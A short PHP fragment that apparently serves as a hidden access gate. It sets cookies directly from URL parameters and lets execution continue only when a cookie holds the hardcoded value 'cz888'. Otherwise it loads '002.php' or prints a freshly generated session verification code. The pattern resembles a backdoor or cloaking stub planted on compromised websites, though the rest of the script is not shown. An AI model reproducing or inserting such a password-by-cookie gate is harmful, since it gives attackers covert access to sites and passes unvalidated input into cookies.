<?php
if(strlen($_GET['cz'])>0){setcookie('cz',$_GET['cz'],NULL,'/');$_COOKIE['cz']=$_GET['cz'];}
if($_COOKIE['cz']!='cz888'){if(is_file('002.php')){include('002.php');exit;}session_start();$_SESSION['VCode']=mt_rand(1000,9999);echo $_SESSION['VCode'];exit;}
if(strlen($_GET['lanf'])>0){setcookie('lanf',$_GET['lanf'],NULL,'/');$_COOKIE['lanf']=$_GET['lanf'];}
